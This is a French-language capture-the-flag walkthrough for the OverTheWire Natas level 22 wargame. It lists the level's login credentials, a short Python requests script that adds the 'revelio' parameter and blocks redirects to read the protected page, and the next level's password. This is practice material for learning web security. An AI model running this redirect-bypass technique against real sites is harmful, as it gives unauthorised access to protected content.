## Connexion (username=natas22 password=964laB0r7TuDqJj5b3HFtwsQoc0GhjBF)
```
http://natas22.natas.labs.overthewire.org/
```

## Recherche du mot de passe
Il faut juste envoyer le paramètre revelio et empêcher les redirections.
```python
import requests

url = "http://natas22.natas.labs.overthewire.org/"
header = {
    "Authorization": "Basic bmF0YXMyMjo5NjRsYUIwcjdUdURxSmo1YjNIRnR3c1FvYzBHaGpCRg=="
}
with requests.Session() as session:
    session.headers.update(header)
    response = session.get(url)
    header["Cookie"] = "PHPSESSID=" + response.cookies.get_dict()["PHPSESSID"]
    session.headers.update(header)
    url += "?revelio"
    response = session.get(url, allow_redirects=False)
    print(response.text)
```
## Prochain mot de passe
```
CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5
```